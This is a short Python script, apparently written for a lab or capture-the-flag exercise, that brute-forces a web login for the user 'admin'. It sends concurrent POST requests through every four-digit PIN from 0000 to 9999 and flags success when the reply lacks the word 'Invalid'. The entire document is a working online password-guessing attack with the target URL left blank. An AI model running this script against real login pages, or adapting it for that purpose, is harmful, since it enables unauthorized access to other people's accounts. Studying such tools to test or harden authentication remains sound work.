#!/usr/bin/env python3
import requests
import string
import asyncio
import aiohttp

url = ""
username = "admin"

# Generate 4-digit numeric passwords (0000..9999)
password_list = [str(i).zfill(4) for i in range(10000)]

async def try_password(session, password, semaphore):
    async with semaphore:
        data = {"username": username, "password": password}
        async with session.post(url, data=data) as response:
            text = await response.text()
            if "Invalid" not in text:
                print(f"[+] Found valid credentials: {username}:{password}")
                return password
            else:
                print(f"[-] Attempted: {password}")
    return None

async def brute_force():
    # Limit requests ------------>
    semaphore = asyncio.Semaphore(50) 
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        for password in password_list:
            task = asyncio.create_task(try_password(session, password, semaphore))
            tasks.append(task)
        
        for completed_task in asyncio.as_completed(tasks):
            result = await completed_task
            if result:
                for task in tasks:
                    if not task.done():
                        task.cancel()
                break

asyncio.run(brute_force())
